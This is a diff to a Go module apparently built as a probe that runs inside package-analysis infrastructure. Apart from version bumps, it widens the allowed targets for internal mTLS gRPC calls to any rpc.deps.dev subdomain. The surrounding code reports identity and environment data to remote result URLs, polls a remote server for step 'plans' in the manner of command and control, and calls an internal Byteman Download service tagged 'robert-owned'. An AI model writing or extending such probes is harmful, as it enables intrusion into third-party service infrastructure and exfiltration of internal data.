@@ -35,7 +35,7 @@ var rpcDialAddress string
 const (
 	protocolVersion = 1
 	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.29-codex"
+	probeVersion    = "v0.0.30-codex"
 	maximumResult   = 256 * 1024
 	maximumBody     = 256 * 1024
 	requestTimeout  = 20 * time.Second
@@ -172,7 +172,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v029-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v030-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -312,7 +312,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v029-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v030-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -344,7 +344,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			runBytemanProbe(&report, step.TLSServerName)
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v029-codex-step-" + strconv.Itoa(cursor)
+		id := "v030-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -363,7 +363,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v029-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v030-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -434,12 +434,23 @@ func validatePlanStep(step planStep) error {
 }
 
 func allowedTLSServerName(value string) bool {
-	switch value {
-	case "localhost", "rpc", "rpc.default.svc.cluster.local":
+	if value == "rpc.deps.dev" {
 		return true
-	default:
+	}
+	const suffix = ".rpc.deps.dev"
+	if !strings.HasSuffix(value, suffix) {
 		return false
 	}
+	label := strings.TrimSuffix(value, suffix)
+	if len(label) < 1 || len(label) > 63 || label[0] == '-' || label[len(label)-1] == '-' {
+		return false
+	}
+	for _, character := range label {
+		if (character < 'a' || character > 'z') && (character < '0' || character > '9') && character != '-' {
+			return false
+		}
+	}
+	return true
 }
 
 func fillCapslockContext(report *probeReport) {
@@ -459,7 +470,7 @@ func fillCapslockContext(report *probeReport) {
 func runBytemanProbe(report *probeReport, tlsServerName string) {
 	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
-	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.29-codex canary\n"))
+	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.30-codex canary\n"))
 	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
 	rpcClient, rpcEndpoint, err := newMTLSClient(tlsServerName)
 	if err != nil {
@@ -482,7 +493,7 @@ func runBytemanProbe(report *probeReport, tlsServerName string) {
 	downloadRequest := []byte{}
 	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
 	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
-	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v029-codex-byteman-probe")
+	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v030-codex-byteman-probe")
 	report.DownloadAttempted = true
 	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
 	report.Byteman = append(report.Byteman, download)
